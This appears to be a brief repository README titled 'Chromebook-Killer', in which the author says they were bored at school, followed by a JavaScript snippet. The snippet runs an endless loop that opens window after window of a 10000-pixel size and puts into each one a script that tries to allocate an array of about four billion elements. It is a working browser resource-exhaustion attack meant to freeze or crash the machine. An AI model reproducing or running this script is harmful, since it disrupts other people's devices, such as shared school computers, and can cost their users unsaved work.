# Chromebook-Killer
I was bored in school. Nothing new there.

for(;;){
  var a = Math.floor(100 * Math.random() + 1);
  b = window.open("_blank","Lag" + a,"height = 10000,width = 10000");
  b.document.body.innerHTML="<script>[...Array(2**32-1)]</script>";
}
